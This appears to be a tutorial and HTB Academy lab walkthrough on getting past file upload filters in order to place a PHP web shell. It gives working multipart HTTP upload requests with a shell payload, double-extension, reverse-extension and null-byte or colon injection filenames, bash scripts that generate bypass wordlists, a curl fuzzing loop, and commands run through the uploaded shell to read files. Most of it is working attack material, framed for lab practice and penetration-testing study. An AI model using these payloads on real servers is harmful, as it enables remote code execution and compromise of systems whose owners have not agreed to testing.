# Basic Bypass Techniques

> **��️ Filter Evasion:** Essential methods to bypass upload restrictions and execute malicious files

## Overview

Upload filters come in two main types: **blacklists** (deny specific extensions) and **whitelists** (allow only specific extensions). Whitelists are generally more secure than blacklists, but both can be bypassed with proper techniques.

**Use Cases:**
- **Blacklist** - File managers allowing wide variety of file types
- **Whitelist** - Upload functionality with limited allowed file types  
- **Combined** - Both used in tandem for enhanced security

---

## Whitelist Filters

> **🎯 More Secure:** Only specified extensions are allowed, but still vulnerable to bypass techniques

### Understanding Whitelist Validation

**Example PHP Whitelist Test:**
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

**⚠️ Vulnerability:** The regex only checks if the filename **contains** the extension, not if it **ends** with it.

### Fuzzing Whitelisted Extensions

**Test with extension wordlist:**
```bash
# Use Burp Intruder with common extensions
# Result: All PHP variations blocked (.php, .php5, .php7, .phtml)
# Some non-PHP extensions may be allowed
```

**Expected Response:**
```
"Only images are allowed" - for blocked extensions
HTTP 200 + upload success - for allowed extensions
```

---

## Double Extensions

> **🔄 Classic Bypass:** Add allowed extension while keeping malicious extension

### Double Extension Technique

**Concept:** If `.jpg` is allowed, use `shell.jpg.php` to:
1. **Pass whitelist test** - contains `.jpg` extension
2. **Execute as PHP** - ends with `.php` extension

**Implementation:**
```bash
# Original filename: shell.php
# Bypass filename: shell.jpg.php
# Content: <?php system($_REQUEST['cmd']); ?>
```

**Burp Suite Request:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

------boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.php"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
------boundary--
```

**Testing Execution:**
```bash
# Access: http://SERVER_IP:PORT/profile_images/shell.jpg.php?cmd=id
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Strict Regex Patterns

**More Secure Implementation:**
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    // Uses $ at the end to match only final extension
}
```

**This pattern blocks:** `shell.jpg.php` (doesn't end with image extension)

---

## Reverse Double Extension

> **🔄 Server Misconfiguration:** Exploit web server configuration weaknesses

### Web Server Configuration Vulnerability

**Apache PHP Configuration (\`/etc/apache2/mods-enabled/php7.4.conf\`):**
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**⚠️ Vulnerability:** Missing \`$\` at the end allows any file **containing** PHP extensions to execute.

### Reverse Double Extension Attack

**Technique:** Use \`shell.php.jpg\` to:
1. **Pass strict whitelist** - ends with \`.jpg\`
2. **Execute as PHP** - contains \`.php\` in filename

**Implementation:**
```bash
# Filename: shell.php.jpg
# Whitelist check: PASS (ends with .jpg)
# PHP execution: SUCCESS (contains .php)
```

**Burp Suite Request:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

------boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
------boundary--
```

**Testing Execution:**
```bash
# Access: http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=id
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Character Injection

> **💉 Advanced Bypass:** Inject special characters to manipulate filename interpretation

### Character Injection Techniques

**Injectable Characters:**
- \`%20\` - Space character
- \`%0a\` - Line Feed (LF)
- \`%00\` - Null byte (PHP ≤ 5.X)
- \`%0d0a\` - Carriage Return + Line Feed (CRLF)
- \`/\` - Forward slash
- \`.\\\` - Backslash with dot
- \`.\` - Dot
- \`…\` - Horizontal ellipsis
- \`:\` - Colon (Windows)

### Null Byte Injection

**Classic PHP ≤ 5.X Bypass:**
```bash
# Filename: shell.php%00.jpg
# PHP interpretation: shell.php (stops at %00)
# Whitelist check: PASS (sees .jpg extension)
```

### Windows Colon Injection

**Windows-specific bypass:**
```bash
# Filename: shell.aspx:.jpg
# Windows interpretation: shell.aspx (ignores :)
# Whitelist check: PASS (sees .jpg extension)
```

### Character Injection Wordlist Generator

**Automated Permutation Script:**
```bash
#!/bin/bash
# Generate all character injection permutations

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phtml' '.php3' '.php4' '.php5'; do
        echo "shell\$char\$ext.jpg" >> wordlist.txt
        echo "shell\$ext\$char.jpg" >> wordlist.txt
        echo "shell.jpg\$char\$ext" >> wordlist.txt
        echo "shell.jpg\$ext\$char" >> wordlist.txt
    done
done
```

**Enhanced Script with More Extensions:**
```bash
#!/bin/bash
# Comprehensive character injection wordlist

# Characters to inject
chars=('%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '…' ':' '%09' '%0b' '%0c')

# PHP extensions
php_exts=('.php' '.phps' '.phtml' '.php3' '.php4' '.php5' '.php7' '.phar')

# Allowed extensions  
allowed_exts=('.jpg' '.jpeg' '.png' '.gif' '.bmp' '.ico')

for char in "\${chars[@]}"; do
    for php_ext in "\${php_exts[@]}"; do
        for allowed_ext in "\${allowed_exts[@]}"; do
            # Before PHP extension
            echo "shell\$char\$php_ext\$allowed_ext" >> char_injection_wordlist.txt
            # After PHP extension
            echo "shell\$php_ext\$char\$allowed_ext" >> char_injection_wordlist.txt
            # Before allowed extension
            echo "shell\$allowed_ext\$char\$php_ext" >> char_injection_wordlist.txt
            # After allowed extension
            echo "shell\$allowed_ext\$php_ext\$char" >> char_injection_wordlist.txt
        done
    done
done

echo "Generated \$(wc -l < char_injection_wordlist.txt) filename permutations"
```

### Burp Suite Fuzzing Setup

**Intruder Configuration:**
1. **Intercept upload request**
2. **Set payload position in filename**
3. **Load character injection wordlist**
4. **Disable URL encoding in payload processing**
5. **Run attack and analyze responses**

**Payload Position:**
```http
Content-Disposition: form-data; name="uploadFile"; filename="§wordlist_payload§"
```

---

## HTB Academy Lab Solution

### Lab Information
- **Objective:** Bypass blacklist and whitelist to upload PHP script
- **Target:** Read \`/flag.txt\` using uploaded shell
- **Techniques:** Double extensions, character injection

### Step-by-Step Walkthrough

**Step 1: Reconnaissance**
```bash
# Test basic PHP upload
filename="shell.php" → BLOCKED

# Test image upload  
filename="test.jpg" → SUCCESS

# Confirms whitelist filtering
```

**Step 2: Double Extension Bypass**
```bash
# Test: shell.jpg.php
# Whitelist: PASS (contains .jpg)
# Execution: SUCCESS (ends with .php)
```

**Step 3: Upload Web Shell**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

------boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.php"
Content-Type: image/jpeg

<?php system(\$_REQUEST['cmd']); ?>
------boundary--
```

**Step 4: Execute Commands**
```bash
# Test execution
http://TARGET/uploads/shell.jpg.php?cmd=id

# Read flag
http://TARGET/uploads/shell.jpg.php?cmd=cat /flag.txt
```

**Step 5: Alternative Methods (if needed)**
```bash
# Try reverse double extension
filename="shell.php.jpg"

# Try character injection
filename="shell.php%00.jpg"
filename="shell.php%20.jpg"  
filename="shell.aspx:.jpg"
```

### Expected Flag Format
```bash
HTB{...}
```

---

## Bypass Methodology

### Systematic Testing Approach

**1. Baseline Testing:**
```bash
# Test allowed extensions
.jpg, .jpeg, .png, .gif → SUCCESS
.php, .phtml, .php5 → BLOCKED
```

**2. Double Extension Testing:**
```bash
shell.jpg.php
shell.png.php  
shell.gif.phtml
```

**3. Reverse Double Extension:**
```bash
shell.php.jpg
shell.phtml.png
shell.php5.gif
```

**4. Character Injection:**
```bash
shell.php%00.jpg
shell.php%20.jpg
shell.aspx:.jpg
```

**5. Web Server Specific:**
```bash
# IIS
shell.asp;.jpg
shell.aspx;.png

# Apache
shell.php/.jpg
shell.phtml\\\\.png
```

### Response Analysis

**Success Indicators:**
- HTTP 200 status code
- Upload confirmation message
- File accessible via direct URL
- Command execution works

**Failure Indicators:**
- HTTP 403/406 status codes
- "Only images allowed" messages
- File not accessible
- No command execution

### Tools for Testing

**Burp Suite Intruder:**
- Load bypass wordlists
- Disable URL encoding
- Analyze response patterns
- Filter successful uploads

**Custom Fuzzing Scripts:**
```bash
#!/bin/bash
# Test double extensions
for ext in php phtml php3 php4 php5; do
    curl -X POST -F "file=@shell.\$ext.jpg" http://target/upload.php
done
```

This comprehensive guide covers all essential bypass techniques for defeating upload filters, providing both theoretical understanding and practical implementation methods for successful exploitation.
